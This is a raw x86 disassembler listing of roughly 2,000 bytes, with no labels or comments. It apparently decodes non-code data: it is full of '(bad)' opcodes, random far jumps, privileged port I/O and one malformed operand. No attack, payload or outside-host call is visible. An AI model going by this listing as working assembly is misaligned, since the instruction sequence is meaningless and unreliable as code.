  42213b:	test   BYTE PTR [ebx],dh
  42213d:	inc    esp
  42213e:	out    0x38,al
  422140:	fcom   DWORD PTR [ebp+0x38b38562]
  422146:	inc    edi
  422147:	push   esp
  422148:	add    esi,DWORD PTR [edx+0x72ac0bc2]
  42214e:	or     BYTE PTR [edi+0x63cb05cd],dl
  422154:	push   ebp
  422155:	xor    DWORD PTR [eax+0x4a99263d],0xffffffe0
  42215c:	inc    ebp
  42215d:	or     al,0x37
  42215f:	lock test al,0x3c
  422162:	mov    ebx,0xfc007a77
  422167:	mov    ch,0x86
  422169:	jno    0x4221a2
  42216b:	inc    esi
  42216c:	cwde   
  42216d:	push   cs
  42216e:	adc    eax,ecx
  422170:	(bad)  
  422171:	xor    esi,DWORD PTR [ecx]
  422173:	jns    0x422194
  422175:	adc    esp,0x2d926f98
  42217b:	mov    BYTE PTR [edx-0x236e081],al
  422181:	cs pop edi
  422183:	cmp    dl,ch
  422185:	out    0x3a,al
  422187:	dec    edx
  422188:	ror    BYTE PTR [edx-0x52],1
  42218b:	inc    edx
  42218c:	(bad)  
  42218d:	(bad)  
  42218e:	fwait
  42218f:	xchg   edx,eax
  422190:	adc    DWORD PTR [esi-0x26c5d5b2],edx
  422196:	div    DWORD PTR [esi+0x77]
  422199:	in     eax,0x83
  42219b:	ret    0x24fe
  42219e:	or     eax,0x46eabf5b
  4221a3:	retf   
  4221a4:	mov    ebp,0x4619cf79
  4221a9:	mov    eax,0xf62d0de9
  4221ae:	or     eax,0x838f68e9
  4221b3:	movd   DWORD PTR cs:[esi+0x6ccdb56b],mm4
  4221bb:	jmp    0x62e0:0x296b5c65
  4221c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221c3:	push   eax
  4221c4:	and    ebp,DWORD PTR [ecx]
  4221c6:	xor    dl,al
  4221c8:	jb     0x4221e4
  4221ca:	popa   
  4221cb:	push   ebx
  4221cc:	fidiv  DWORD PTR [ebx-0x8]
  4221cf:	and    ecx,edi
  4221d1:	pop    esp
  4221d2:	ja     0x42224f
  4221d4:	in     al,0x2d
  4221d6:	cmp    BYTE PTR [ecx+0x17],bl
  4221d9:	ret    
  4221da:	cli    
  4221db:	scas   eax,DWORD PTR es:[edi]
  4221dc:	mov    al,ds:0xe0a67f58
  4221e1:	and    al,0xd5
  4221e3:	push   ecx
  4221e4:	and    eax,0x1e8e2bec
  4221e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221ea:	pop    ds
  4221eb:	cmc    
  4221ec:	pop    edx
  4221ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221ee:	xor    BYTE PTR [edx+0x3ba063ec],0x58
  4221f5:	sub    eax,0xdbf7b5a4
  4221fa:	jge    0x422216
  4221fc:	ds dec esi
  4221ff:	fistp  DWORD PTR [edx+edx*1]
  422202:	pusha  
  422203:	pop    eax
  422204:	lods   eax,DWORD PTR ds:[esi]
  422205:	mov    bh,0x42
  422207:	cmp    al,0x76
  422209:	mov    edx,0x8cd546b2
  42220e:	jp     0x422275
  422210:	mov    esi,0xf8767ea0
  422215:	sub    al,dh
  422217:	and    bh,bh
  422219:	sbb    al,0x4f
  42221b:	sti    
  42221c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42221d:	mov    edx,0x1b340dbb
  422222:	xchg   ebp,eax
  422223:	jne    0x4221eb
  422225:	imul   esp,edi,0x33f895c3
  42222b:	xchg   esp,eax
  42222c:	addr16 cmp eax,0xe7599973
  422232:	dec    edx
  422233:	fsub   st(0),st
  422235:	aam    0x16
  422237:	mov    bh,0xec
  422239:	imul   edx,DWORD PTR [edx*8+0x5261000a],0x28
  422241:	push   0xfffffff9
  422243:	add    eax,0x33fa0061
  422248:	pop    edi
  422249:	test   ecx,0xea635403
  42224f:	ins    BYTE PTR es:[edi],dx
  422250:	mov    ch,0x6d
  422252:	lock add eax,0x3a65b920
  422258:	or     ebx,edx
  42225a:	popf   
  42225b:	shr    DWORD PTR [esi],0x58
  42225e:	cs push cs
  422260:	or     al,BYTE PTR [esi]
  422262:	sbb    eax,0x366647ee
  422267:	mov    ?,WORD PTR [esp+ebp*1+0x70]
  42226b:	or     ebp,DWORD PTR [edi-0x40ba3b84]
  422271:	jecxz  0x4222d5
  422273:	lods   al,BYTE PTR ds:[esi]
  422274:	ror    DWORD PTR [ebx+0xe17a31c],0xe5
  42227b:	js     0x422207
  42227d:	mov    al,ds:0xc55a2322
  422282:	mov    cl,0xa3
  422284:	pop    edx
  422285:	pop    es
  422286:	xor    eax,edi
  422288:	pop    esi
  422289:	lea    ebx,[edi+0x63]
  42228c:	test   al,0x22
  42228e:	pushf  
  42228f:	ss int 0xc9
  422292:	and    ah,al
  422294:	pop    ecx
  422295:	hlt    
  422296:	sbb    dh,bh
  422298:	and    DWORD PTR [ecx-0x26a4215b],0x8c67037b
  4222a2:	iret   
  4222a3:	push   eax
  4222a4:	lods   al,BYTE PTR ds:[esi]
  4222a5:	add    DWORD PTR [ecx+0xae60471],esp
  4222ab:	stc    
  4222ac:	cmp    al,0xb5
  4222ae:	dec    esp
  4222af:	push   DWORD PTR gs:[edx-0x7]
  4222b3:	retf   
  4222b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222b5:	sub    DWORD PTR [ebx],0x2eb9e09e
  4222bb:	push   edx
  4222bc:	cmp    al,0x29
  4222be:	mov    esi,0xfbf65cb6
  4222c3:	mov    ch,0xa6
  4222c5:	je     0x4222fc
  4222c7:	pop    esp
  4222c8:	add    DWORD PTR [esi+0x10],ecx
  4222cb:	rcr    BYTE PTR [edi-0x20],cl
  4222ce:	loop   0x422314
  4222d0:	imul   esp,DWORD PTR [edx],0x3e83f9be
  4222d6:	add    al,BYTE PTR [ebx+0x2b0e05d7]
  4222dc:	xchg   DWORD PTR [edx+edx*1+0x5],esp
  4222e0:	or     eax,0x7fcd01d7
  4222e5:	cli    
  4222e6:	lds    edi,FWORD PTR [ebx]
  4222e8:	pop    ebp
  4222e9:	or     DWORD PTR [ebx],ebx
  4222eb:	jnp    0x422284
  4222ed:	and    ecx,DWORD PTR [edi]
  4222ef:	xchg   edi,eax
  4222f0:	dec    esp
  4222f1:	pop    edi
  4222f2:	inc    edx
  4222f3:	xchg   esi,eax
  4222f4:	dec    esp
  4222f5:	retf   0x537
  4222f8:	pop    esp
  4222f9:	stos   BYTE PTR es:[edi],al
  4222fa:	popa   
  4222fb:	mov    edi,0x466d1f04
  422300:	inc    ecx
  422301:	test   BYTE PTR [eax+0xd],ch
  422304:	arpl   WORD PTR [esi-0x7e],dx
  422307:	fnstcw WORD PTR [esi+0x42177]
  42230d:	and    DWORD PTR [edx+0x7d407280],esi
  422313:	in     eax,0xba
  422315:	cmp    BYTE PTR [ebx+0x9caf890],ch
  42231b:	mov    esi,0x3d0badd7
  422320:	adc    BYTE PTR [ebx+0x119b2c64],0x4e
  422327:	aaa    
  422328:	adc    ebx,DWORD PTR [edx-0x1076006d]
  42232e:	inc    ebx
  42232f:	mov    ecx,0x9cde294
  422334:	imul   esp,DWORD PTR [ecx-0x54b2dd4e],0x17c82b3f
  42233e:	inc    ecx
  42233f:	stos   DWORD PTR es:[edi],eax
  422340:	mov    ch,0xcb
  422342:	xchg   edi,eax
  422343:	(bad)  
  422344:	lods   eax,DWORD PTR ds:[esi]
  422345:	aam    0x31
  422347:	mov    dh,0xce
  422349:	inc    esp
  42234a:	(bad)  
  42234b:	jmp    0x4f6e:0xb25db401
  422352:	and    bh,BYTE PTR [esi-0x5b]
  422355:	or     DWORD PTR [eax],ebp
  422357:	cmp    al,BYTE PTR [edx-0x4e]
  42235a:	jge    0x4223d7
  42235c:	jmp    0x1085:0x3a1a4933
  422363:	sbb    al,0x21
  422365:	adc    al,BYTE PTR [edi-0x58a9a80f]
  42236b:	sbb    eax,0x2294b894
  422370:	add    BYTE PTR [esi+0x7c],al
  422373:	jno    0x422363
  422375:	lods   al,BYTE PTR ds:[esi]
  422376:	dec    ebx
  422377:	add    eax,0xe7b4e711
  42237c:	scas   al,BYTE PTR es:[edi]
  42237d:	mov    bh,0x3b
  42237f:	(bad)  
  422380:	pop    ecx
  422381:	jmp    0x4223ec
  422383:	pop    ecx
  422384:	daa    
  422385:	cmp    edx,DWORD PTR [edx+ebx*8-0x7b]
  422389:	shl    DWORD PTR [ecx-0x1f],0x90
  42238d:	(bad)  
  42238e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42238f:	xchg   ebx,eax
  422390:	pop    ds
  422391:	in     al,dx
  422392:	pop    edi
  422393:	mov    BYTE PTR [edi+0x2b],ch
  422396:	mov    ecx,0xcf8f1319
  42239b:	adc    ecx,DWORD PTR [eax]
  42239d:	mov    ecx,0xcf85acf0
  4223a2:	and    BYTE PTR [eax-0x1560d5db],dh
  4223a8:	push   ecx
  4223a9:	mov    ebp,DWORD PTR [esp+eax*1]
  4223ac:	push   ds
  4223ad:	adc    ebp,ebp
  4223af:	push   cs
  4223b0:	and    ebx,edx
  4223b2:	sub    BYTE PTR [edi+0x2ff4e923],0x52
  4223b9:	mov    dh,0xb7
  4223bb:	mov    esi,0xbc631652
  4223c0:	adc    dl,bh
  4223c2:	and    dl,BYTE PTR ds:[eax-0x46d1ad8d]
  4223c9:	inc    edi
  4223ca:	ror    BYTE PTR [ebx+edx*4+0x671b45c8],cl
  4223d1:	mov    al,cl
  4223d3:	jns    0x422361
  4223d5:	or     eax,0x49e12d4
  4223da:	and    DWORD PTR [eax],eax
  4223dc:	jecxz  0x42240a
  4223de:	jbe    0x4223f1
  4223e0:	ss sbb al,0x2a
  4223e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e4:	arpl   WORD PTR [ecx+0xb67debc],si
  4223ea:	push   ecx
  4223eb:	popf   
  4223ec:	ret    
  4223ed:	shl    bh,1
  4223ef:	sub    bh,ah
  4223f1:	xchg   DWORD PTR [ebx],ecx
  4223f3:	sbb    BYTE PTR [esi-0x102fef71],dl
  4223f9:	shr    BYTE PTR [ebp-0x3761b8d1],1
  4223ff:	hlt    
  422400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422401:	mov    ch,0xf5
  422403:	or     ebp,DWORD PTR [edi-0x210b3331]
  422409:	or     al,0x36
  42240b:	xchg   edx,eax
  42240c:	jl     0x4223c2
  42240e:	or     bh,BYTE PTR ds:0xef1de959
  422414:	lahf   
  422415:	mov    bl,cl
  422417:	ss sub eax,0x8a8f0413
  42241e:	inc    ecx
  42241f:	push   0xad252fe3
  422424:	dec    esp
  422425:	sub    eax,DWORD PTR [eax-0xde0e58]
  42242b:	imul   ecx,DWORD PTR [esi],0x48
  42242e:	add    ah,BYTE PTR [esi+0x6f]
  422431:	mov    edx,esi
  422433:	xchg   DWORD PTR [esi],edx
  422435:	cdq    
  422436:	mov    bl,0x3a
  422438:	daa    
  422439:	mov    ch,0xc3
  42243b:	je     0x4223ff
  42243d:	mov    al,0x49
  42243f:	jno    0x422447
  422441:	sub    al,0x37
  422443:	dec    esp
  422444:	(bad)  
  422446:	mov    edx,0xcfd7387a
  42244b:	aad    0xa8
  42244d:	arpl   WORD PTR [esi+0x10],di
  422450:	pop    edi
  422451:	pop    esp
  422452:	jl     0x422467
  422454:	xor    BYTE PTR [bx+si],bl
  422457:	xor    BYTE PTR [edx+0x74b7e031],dh
  42245d:	idiv   BYTE PTR [edi+0x3e]
  422460:	or     DWORD PTR [ebx-0x25],ebx
  422463:	out    dx,al
  422464:	xor    al,BYTE PTR [edx-0x78]
  422467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422468:	or     bl,BYTE PTR [edi-0x3f]
  42246b:	adc    DWORD PTR [esi+eax*2],ecx
  42246e:	std    
  42246f:	out    0x6a,al
  422471:	dec    edx
  422472:	sbb    ch,BYTE PTR [edi]
  422474:	cmovle edi,DWORD PTR [edx+0x67e653f5]
  42247b:	dec    ecx
  42247c:	test   al,0xfd
  42247e:	xor    eax,0xfdcc5a62
  422483:	push   esp
  422484:	outs   dx,BYTE PTR ds:[esi]
  422485:	sahf   
  422486:	add    DWORD PTR [ebx],esp
  422488:	stos   BYTE PTR es:[edi],al
  422489:	cli    
  42248a:	sbb    BYTE PTR [ebx],cl
  42248c:	fwait
  42248d:	ret    
  42248e:	adc    al,0xd7
  422490:	fst    DWORD PTR [ecx+edx*2]
  422493:	iret   
  422494:	push   ebx
  422495:	pushf  
  422496:	ins    BYTE PTR es:[edi],dx
  422497:	jle    0x422490
  422499:	aad    0xc5
  42249b:	pop    ebx
  42249c:	scas   al,BYTE PTR es:[edi]
  42249d:	sbb    BYTE PTR ds:0xe7f74257,ch
  4224a3:	pop    ss
  4224a4:	mov    ecx,0xdd7f5d83
  4224a9:	sub    eax,0x15d7b312
  4224ae:	push   ebx
  4224af:	pop    esi
  4224b0:	push   ds
  4224b1:	out    0xca,al
  4224b3:	cdq    
  4224b4:	add    DWORD PTR [eax+0x2d9e33cf],esp
  4224ba:	cmp    eax,0xc1b9295b
  4224bf:	dec    edi
  4224c0:	outs   dx,BYTE PTR ds:[esi]
  4224c1:	fnstsw WORD PTR [esi]
  4224c3:	or     edi,ebx
  4224c5:	stc    
  4224c6:	cmc    
  4224c7:	pusha  
  4224c8:	inc    ecx
  4224c9:	ja     0x4224c1
  4224cb:	ror    DWORD PTR [edx-0x2b],0xa1
  4224cf:	xchg   ecx,eax
  4224d0:	add    edx,DWORD PTR [edi+0x9]
  4224d3:	push   ss
  4224d4:	push   es
  4224d5:	pop    ecx
  4224d6:	cmp    DWORD PTR [ecx+eiz*4],ebp
  4224d9:	mov    ah,0x89
  4224db:	push   ecx
  4224dc:	and    BYTE PTR [edx-0x494627fb],ah
  4224e2:	out    dx,al
  4224e3:	inc    esp
  4224e4:	ret    
  4224e5:	fidiv  DWORD PTR ds:0xb8efb5e9
  4224eb:	scas   eax,DWORD PTR es:[edi]
  4224ec:	inc    esp
  4224ed:	ss sub al,0x29
  4224f0:	pop    edi
  4224f1:	mov    al,ds:0xc3ebd3c4
  4224f6:	jmp    0x49f:0xdc9a6c83
  4224fd:	inc    esi
  4224fe:	dec    ebx
  4224ff:	sbb    al,0x2d
  422501:	inc    eax
  422502:	out    dx,al
  422503:	fiadd  WORD PTR [eax]
  422505:	or     dl,BYTE PTR ss:[ebx+0x4e41002f]
  42250c:	lods   al,BYTE PTR ds:[esi]
  42250d:	(bad)  
  42250e:	pop    ds
  42250f:	ins    DWORD PTR es:[edi],dx
  422510:	je     0x4224a2
  422512:	mov    ss,WORD PTR [ecx+0x26]
  422515:	js     0x422504
  422517:	pop    ebx
  422518:	mov    dl,0xbc
  42251a:	push   0xffffff8b
  42251c:	push   es
  42251d:	rcr    BYTE PTR ds:0x7f87a168,0x34
  422524:	jno    0x42254e
  422526:	das    
  422527:	(bad)  
  422528:	pop    esi
  422529:	into   
  42252a:	cdq    
  42252b:	jle    0x422586
  42252d:	and    eax,0xa1c7289a
  422532:	xchg   ebx,eax
  422533:	mov    esi,0x73798651
  422538:	repz cmp al,dh
  42253b:	inc    eax
  42253c:	add    BYTE PTR [esi],cl
  42253e:	inc    esp
  42253f:	or     eax,0xa88bd4c3
  422544:	retf   
  422545:	js     0x4224d7
  422547:	lock call 0x634a546b
  42254d:	xor    ebx,ebx
  42254f:	ficom  WORD PTR [edi]
  422551:	cld    
  422552:	sbb    al,0xde
  422554:	call   0x59d7:0xee4a27f4
  42255b:	mov    ds:0xdfcf3c4f,eax
  422560:	adc    ebx,edi
  422562:	mov    ecx,0x7730932a
  422567:	std    
  422568:	mov    ds:0x8a5d3f15,eax
  42256d:	lods   eax,DWORD PTR ds:[esi]
  42256e:	out    0x91,al
  422570:	retf   
  422571:	aas    
  422572:	out    0xe7,al
  422574:	xchg   ecx,eax
  422575:	xchg   ebp,eax
  422576:	fist   WORD PTR [esi+0x64ea3997]
  42257c:	mov    ebx,0xedc2a76f
  422581:	sti    
  422582:	jg     0x422585
  422584:	adc    BYTE PTR [ebp-0x7b],0x64
  422588:	mov    dl,0x96
  42258a:	cmp    DWORD PTR [esi-0xd833db4],esi
  422590:	inc    BYTE PTR [edx+0x74]
  422593:	inc    ecx
  422594:	into   
  422595:	loop   0x4225de
  422597:	int3   
  422598:	scas   al,BYTE PTR es:[edi]
  422599:	push   es
  42259a:	cld    
  42259b:	iret   
  42259c:	xchg   BYTE PTR [edx-0x5c77732a],ch
  4225a2:	out    dx,eax
  4225a3:	mov    dh,0x67
  4225a5:	inc    ebp
  4225a6:	pop    esi
  4225a7:	mov    edx,0x96463981
  4225ac:	mov    gs,WORD PTR [ebx+0x64]
  4225af:	cmp    eax,0xed13ea6a
  4225b4:	push   ds
  4225b5:	ror    BYTE PTR [edx+0x1cbb71c5],cl
  4225bb:	sub    esi,DWORD PTR [ebp-0x4f]
  4225be:	lock jae 0x422547
  4225c1:	cmp    al,ah
  4225c3:	(bad)  
  4225c4:	sub    DWORD PTR [ebx+0x7],edi
  4225c7:	test   ecx,edi
  4225c9:	mov    ds:0xb656457d,al
  4225ce:	xchg   DWORD PTR ds:0xe3b80a69,eax
  4225d4:	sub    esi,DWORD PTR [ecx-0x7d5faca7]
  4225da:	sub    al,0xd
  4225dc:	inc    ebx
  4225dd:	xchg   DWORD PTR gs:[ebx],edx
  4225e0:	arpl   WORD PTR [esi],di
  4225e2:	push   0x7d
  4225e4:	sbb    al,0x78
  4225e6:	pop    es
  4225e7:	dec    esi
  4225e8:	pop    es
  4225e9:	sbb    edi,DWORD PTR [eax-0x19d74884]
  4225ef:	xchg   DWORD PTR [edx-0x42220106],ebx
  4225f5:	fwait
  4225f6:	add    ch,bl
  4225f8:	in     eax,0x5c
  4225fa:	fsubrp st(1),st
  4225fc:	push   ebx
  4225fd:	mov    edi,0x3951b99f
  422602:	lock lea ecx,[edx+eax*2]
  422606:	stc    
  422607:	imul   edi,DWORD PTR ds:0x3e33f79c,0xd2369ea4
  422611:	mov    dl,0x74
  422613:	fistp  WORD PTR [ebx+eax*4+0x7a]
  422617:	lods   eax,DWORD PTR ds:[esi]
  422618:	cmp    edx,DWORD PTR [ecx+edx*2]
  42261b:	ror    BYTE PTR [eax],cl
  42261d:	or     esp,edx
  42261f:	push   esp
  422620:	push   ds
  422621:	mov    bl,0x51
  422623:	ja     0x42260d
  422625:	jno    0x422601
  422627:	jno    0x422645
  422629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262a:	iret   
  42262b:	in     al,0xed
  42262d:	sbb    cl,BYTE PTR [esi]
  42262f:	stos   DWORD PTR es:[edi],eax
  422630:	sub    DWORD PTR [ebx+0x7d],edx
  422633:	mov    cs,ecx
  422635:	push   sp
  422637:	sbb    BYTE PTR [esi],cl
  422639:	jmp    0x840a5470
  42263e:	(bad)  
  42263f:	lods   al,BYTE PTR ds:[esi]
  422640:	mov    bh,0x46
  422642:	stos   BYTE PTR es:[edi],al
  422643:	daa    
  422644:	xchg   edx,eax
  422645:	ja     0x422602
  422647:	jecxz  0x42264c
  422649:	das    
  42264a:	add    eax,0x5d3cc67a
  42264f:	cwde   
  422650:	mov    ah,0x94
  422652:	int3   
  422653:	std    
  422654:	mov    bh,0x19
  422656:	adc    DWORD PTR [edi-0x6b],edi
  422659:	retf   
  42265a:	test   eax,0x205ec024
  42265f:	inc    BYTE PTR [ecx-0x3c]
  422662:	test   esi,ecx
  422664:	aam    0x5
  422666:	push   ebp
  422667:	and    edi,DWORD PTR [edx+0x31f2e538]
  42266d:	mov    WORD PTR [ecx],gs
  42266f:	push   edi
  422670:	push   ecx
  422671:	sub    BYTE PTR [ecx-0x66],dh
  422674:	and    BYTE PTR ds:0x7fe72061,cl
  42267a:	sahf   
  42267b:	and    DWORD PTR [ebx+ebp*2+0x75],edx
  42267f:	mov    al,ds:0x99ba0173
  422684:	mov    ch,0x87
  422686:	xchg   edi,eax
  422687:	cwde   
  422688:	jbe    0x4226f0
  42268a:	sub    al,0x7b
  42268c:	and    bl,ah
  42268e:	inc    ecx
  42268f:	test   DWORD PTR [ebx],0x58025393
  422695:	sub    ebx,edx
  422697:	cmp    bh,BYTE PTR [esp+ebx*8]
  42269a:	loopne 0x4226c9
  42269c:	sub    al,0x8b
  42269e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42269f:	call   0x5eb5c632
  4226a4:	and    eax,0x21b9b3ce
  4226a9:	or     DWORD PTR [ebx+0x70eb202a],esp
  4226af:	es jle 0x422666
  4226b2:	ror    DWORD PTR [edi-0x58],1
  4226b5:	fcomp  DWORD PTR [ecx+0x6128478c]
  4226bb:	popf   
  4226bc:	ins    BYTE PTR es:[edi],dx
  4226bd:	stos   BYTE PTR es:[edi],al
  4226be:	or     cl,BYTE PTR [edx+0x1abead72]
  4226c4:	mov    BYTE PTR [ebp-0xc431b64],dl
  4226ca:	push   edi
  4226cb:	fbld   TBYTE PTR [ebx]
  4226cd:	cmp    ebx,esi
  4226cf:	xor    eax,0x667c0c96
  4226d4:	jae    0x422707
  4226d6:	sti    
  4226d7:	pop    ss
  4226d8:	adc    cl,0x32
  4226db:	mov    esp,0x28fe5835
  4226e0:	in     al,dx
  4226e1:	adc    ebp,esp
  4226e3:	push   ss
  4226e4:	mov    eax,ds:0x9a4ac0b5
  4226e9:	mov    eax,ds:0x9cb9cd57
  4226ee:	jp     0x422720
  4226f0:	fs test al,0x3b
  4226f3:	shl    BYTE PTR [edx],1
  4226f5:	clc    
  4226f6:	nop
  4226f7:	rcl    BYTE PTR [edi+0x3acab1f9],1
  4226fd:	sbb    ah,BYTE PTR [ebx+0x55d78470]
  422703:	test   al,0x9b
  422705:	pop    esp
  422706:	push   ds
  422707:	(bad)  
  422708:	lods   al,BYTE PTR ds:[esi]
  422709:	inc    ebp
  42270a:	int3   
  42270b:	xchg   ecx,eax
  42270c:	sub    eax,0x41b9ee6
  422711:	mov    ebx,0xa324cb2f
  422716:	push   0xffffffd8
  422718:	lea    ecx,[edx]
  42271a:	cmp    eax,0x3d92cb05
  42271f:	adc    esp,DWORD PTR [ecx]
  422721:	inc    eax
  422722:	outs   dx,BYTE PTR ds:[esi]
  422723:	cs ins BYTE PTR es:[edi],dx
  422725:	shl    DWORD PTR [esp+eax*4],1
  422728:	inc    edx
  422729:	xchg   edx,eax
  42272a:	(bad)  
  42272b:	dec    edx
  42272c:	xchg   esi,eax
  42272d:	in     al,dx
  42272e:	inc    edi
  42272f:	add    DWORD PTR [ebx-0x6f473e68],ebx
  422735:	pop    esp
  422736:	in     al,0x76
  422738:	outs   dx,DWORD PTR ds:[esi]
  422739:	push   edx
  42273a:	dec    ebp
  42273b:	(bad)  [eax]
  42273d:	cmp    eax,0x7d828e6d
  422742:	inc    eax
  422743:	jl     0x4226f5
  422745:	in     al,0xc5
  422747:	sahf   
  422748:	lahf   
  422749:	dec    esi
  42274a:	jl     0x4226dc
  42274c:	mov    DWORD PTR gs:[ebx],ecx
  42274f:	mov    eax,ds:0x237d825b
  422754:	fisub  WORD PTR [esp+esi*1+0x4d785104]
  42275b:	icebp  
  42275c:	xor    al,0xfa
  42275e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42275f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422760:	lods   al,BYTE PTR ds:[esi]
  422761:	repz inc esp
  422763:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422765:	cmp    DWORD PTR [edi],ecx
  422767:	aad    0x3f
  422769:	aaa    
  42276a:	mov    ebp,0x94d7ad07
  42276f:	jnp    0x422787
  422771:	aaa    
  422772:	fistp  WORD PTR [eax-0x19]
  422775:	out    0x41,al
  422777:	sub    dh,BYTE PTR [edx+0x77]
  42277a:	mov    cl,0xfc
  42277c:	xor    BYTE PTR [ecx-0x5137bef5],bl
  422782:	in     al,0x98
  422784:	jecxz  0x42270f
  422786:	and    BYTE PTR [ebp-0x35],dh
  422789:	lds    eax,FWORD PTR [esi-0x59d9390c]
  42278f:	ja     0x4227a9
  422791:	test   BYTE PTR [ebp+0x125fb278],0x1
  422798:	mov    al,ds:0x763f9ec2
  42279d:	mov    ds:0xde7c2dcf,eax
  4227a2:	inc    esi
  4227a3:	dec    ebx
  4227a4:	sbb    DWORD PTR ds:0x4f8bb09d,0xffffffac
  4227ab:	aas    
  4227ac:	adc    bh,dh
  4227ae:	clc    
  4227af:	push   edx
  4227b0:	add    eax,0xafe426b7
  4227b5:	mov    ecx,0xb42d3ecc
  4227ba:	xor    ah,BYTE PTR [eax]
  4227bc:	nop
  4227bd:	std    
  4227be:	cmp    ebp,ebx
  4227c0:	sbb    ch,ch
  4227c2:	cdq    
  4227c3:	pop    es
  4227c4:	or     esi,DWORD PTR [edi-0x43d9249b]
  4227ca:	shl    DWORD PTR [ebp-0x7a],1
  4227cd:	pop    ebx
  4227ce:	jp     0x422784
  4227d0:	push   ecx
  4227d1:	mov    esp,0x6d2da79
  4227d6:	jo     0x4227b8
  4227d8:	popf   
  4227d9:	push   ds
  4227da:	push   esi
  4227db:	pop    eax
  4227dc:	jbe    0x42280c
  4227de:	or     BYTE PTR [eax+eiz*4+0x753d9f4b],dl
  4227e5:	jnp    0x422837
  4227e7:	and    ebx,DWORD PTR [edx-0x2e]
  4227ea:	dec    esi
  4227eb:	sbb    edi,edi
  4227ed:	fld    QWORD PTR [ecx+esi*4]
  4227f0:	push   cs
  4227f1:	push   eax
  4227f2:	push   ebx
  4227f3:	leave  
  4227f4:	pop    esi
  4227f5:	pushf  
  4227f6:	rcl    DWORD PTR [ebx],0x70
  4227f9:	xor    al,0x5c
  4227fb:	jle    0x4227d1
  4227fd:	cmp    BYTE PTR [edx+0xd],dl
  422800:	cmp    eax,0xb96d50be
  422805:	mov    gs,WORD PTR [ecx-0x2e]
  422808:	es popf 
  42280a:	fimul  WORD PTR [eax+esi*4+0x7c]
  42280f:	xchg   ebx,eax
  422810:	lahf   
  422811:	cmp    DWORD PTR [ebx],esp
  422813:	loope  0x42279e
  422815:	popa   
  422816:	xchg   DWORD PTR [edx+edx*4],eax
  422819:	shl    BYTE PTR [esi+esi*8-0x16],1
  42281d:	cmp    edx,DWORD PTR [esi]
  42281f:	mov    ebp,DWORD PTR [edx]
  422821:	mov    cl,ch
  422823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422824:	and    al,0x44
  422826:	daa    
  422827:	ror    DWORD PTR [ebp+0x331c245d],0xab
  42282e:	jg     0x4227dd
  422830:	push   cs
  422831:	add    BYTE PTR fs:[ebx-0x49e331ee],cl
  422838:	pop    ss
  422839:	adc    cl,dl
  42283b:	ins    BYTE PTR es:[edi],dx
  42283c:	rcl    DWORD PTR ds:0xdb0e4ce5,0x40
  422843:	mov    DWORD PTR [ecx+0x6],ebx
  422846:	push   edi
  422847:	mov    bh,0xa3
  422849:	mov    esi,0xc9be77fc
  42284e:	out    0xec,al
  422850:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422852:	mov    ebp,edx
  422854:	stos   DWORD PTR es:[edi],eax
  422855:	mov    ah,0xc5
  422857:	repz ja 0x4227de
  42285a:	sub    DWORD PTR [ebx-0xb946913],edx
  422860:	or     edi,edx
  422862:	push   0xdd25c48d
  422867:	cdq    
  422868:	push   ecx
  422869:	cmp    al,0x60
  42286b:	dec    esi
  42286c:	inc    ebx
  42286d:	bound  esp,QWORD PTR [ecx]
  42286f:	pop    ebx
  422870:	imul   edi,DWORD PTR [ebp+0x43c8bfb6],0xffffffd3
  422877:	sahf   
  422878:	and    eax,edi
  42287a:	or     al,0xfb
  42287c:	and    al,0x89
  42287e:	sbb    ebx,DWORD PTR [edx-0x34]
  422881:	xchg   ebp,eax
  422882:	mov    ebx,0x152d9e3a
  422887:	cmp    DWORD PTR [esp+esi*2-0x79],ebp
  42288b:	push   0xf
  42288d:	inc    esp
  42288e:	adc    eax,esi
  422890:	stos   DWORD PTR es:[edi],eax
  422891:	or     al,0x6d
  422893:	xor    esp,esi
  422895:	mov    esp,0x1ef02a57
  42289a:	leave  
  42289b:	shl    DWORD PTR [edi-0x75],0x5c
  42289f:	rcr    dh,0xf7
  4228a2:	int3   
  4228a3:	js     0x422889
  4228a5:	mov    bh,0x13
  4228a7:	fldpi  
  4228a9:	ds xchg ebp,eax
  4228ab:	or     al,0x2
  4228ad:	dec    eax
  4228ae:	dec    edx
  4228af:	pop    eax
  4228b0:	and    al,dh
  4228b2:	(bad)  
  4228b3:	mov    bh,0x9
  4228b5:	inc    esi
  4228b6:	xchg   ecx,eax
  4228b7:	out    0xbf,al
  4228b9:	xchg   ebx,eax
  4228ba:	or     BYTE PTR [ecx],dl
  4228bc:	sub    BYTE PTR [ebx-0x56],bh
  4228bf:	mov    ds:0x98ae1840,al
  4228c4:	aas    
  4228c5:	cmp    al,0x4c
  4228c7:	sbb    al,0x10
  4228c9:	mov    eax,ds:0x8d95a967
  4228ce:	mov    bh,0xd1
  4228d0:	or     al,0x55
  4228d2:	ja     0x422928
  4228d4:	add    dl,0x3b
  4228d7:	ja     0x422866
  4228d9:	arpl   dx,si
  4228db:	nop
  4228dc:	(bad)  
  4228dd:	lock lods al,BYTE PTR ds:[esi]
  4228df:	arpl   WORD PTR [ecx],ax
  4228e1:	test   ecx,0x3790363c
  4228e7:	pusha  
  4228e8:	sub    DWORD PTR [ecx-0x3654c8c1],0xffffffe7
  4228ef:	in     eax,0x64
  4228f1:	adc    eax,0xae6dd95e
  4228f6:	rcr    BYTE PTR [ebp-0x29f867bc],0xa8
  4228fd:	inc    esp
  4228fe:	inc    ebx
  4228ff:	call   0x5c99320d
  422904:	imul   edi,DWORD PTR [ebx+0xc],0x47
  422908:	push   edi
  422909:	pop    ds
  42290a:	in     al,dx
